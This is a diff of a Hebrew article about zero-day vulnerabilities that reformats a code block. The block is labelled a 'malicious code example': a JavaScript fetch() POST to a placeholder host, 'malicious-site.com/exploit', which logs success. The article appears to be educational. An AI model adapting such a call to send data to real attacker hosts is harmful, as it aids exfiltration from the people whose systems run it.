@@ -16,9 +16,9 @@
 
 - **חדשנות התקפה**: פגיעות יום אפס נוצרת כאשר הקהילה או החברה טרם מודעת לבעיה. זה יוצר חלון זמן מסוכן שבו ההאקרים יכולים לפעול.
 
-```quote
 "החולשה הכי מסוכנת היא זו שאיננו יודעים על קיומה." — חוקר אבטחת מידע
 
+```javascript
 // קוד זדוני לדוגמה
 fetch('https://malicious-site.com/exploit', {
   method: 'POST',
@@ -33,6 +33,6 @@ fetch('https://malicious-site.com/exploit', {
 .then(response => response.json())
 .then(data => console.log('Exploited successfully:', data))
 .catch(error => console.error('Error:', error));
+
 ```
 "אל תמתין לפרצה הבאה - הקדם תרופה למכה." — מומחה לאבטחת מידע
-
